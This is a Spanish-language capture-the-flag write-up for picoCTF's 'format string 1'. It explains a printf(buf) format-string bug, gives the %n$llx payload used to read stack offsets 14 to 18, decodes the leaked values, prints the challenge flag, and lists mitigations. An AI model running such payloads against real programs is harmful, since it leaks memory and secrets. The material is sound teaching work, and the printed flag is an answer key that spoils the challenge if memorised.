@@ -1,0 +1,50 @@
+==============================================
+RETO: format string 1 (picoCTF)
+==============================================
+
+OBJETIVO:
+Explotar una vulnerabilidad de format string para leer la flag
+del menú secreto desde la memoria.
+
+ANÁLISIS DEL CÓDIGO:
+El programa tiene una vulnerabilidad clásica en la línea 36:
+    printf(buf);  // VULNERABLE - debería ser printf("%s", buf)
+
+ESTRUCTURA DE LA MEMORIA:
+El programa lee 3 archivos en variables locales del stack:
+- secret1[64] en secret-menu-item-1.txt
+- flag[64] en flag.txt  <- OBJETIVO
+- secret2[64] en secret-menu-item-2.txt
+
+EXPLOTACIÓN:
+1. Identificar offsets en el stack usando %p
+2. La flag está en los offsets 14-18 del stack
+3. Usar format string para leer estos offsets
+
+PAYLOAD USADO:
+%14$016llx%15$016llx%16$016llx%17$016llx%18$016llx
+
+VALORES DEL STACK:
+Offset 14: 0x7b4654436f636970 = "picoCTF{"
+Offset 15: 0x355f31346d316e34 = "4n1m41_5"
+Offset 16: 0x3478345f33317937 = "7y13_4x4"
+Offset 17: 0x31655f673431665f = "_f14g_e1"
+Offset 18: 0x007d383130386531 = "1e8018}\0"
+
+FLAG ENCONTRADA:
+picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}
+
+EXPLICACIÓN:
+"animal style 4x4 flag" - referencia al menú secreto
+(In-N-Out Burger tiene un menú secreto con "Animal Style")
+
+VULNERABILIDAD:
+Format string permite leer/escribir memoria arbitraria cuando
+se pasa entrada del usuario directamente como formato de printf.
+
+MITIGACIÓN:
+- Usar printf("%s", buf) en lugar de printf(buf)
+- Validar entrada del usuario
+- Compilar con -Wformat-security
+
+==============================================
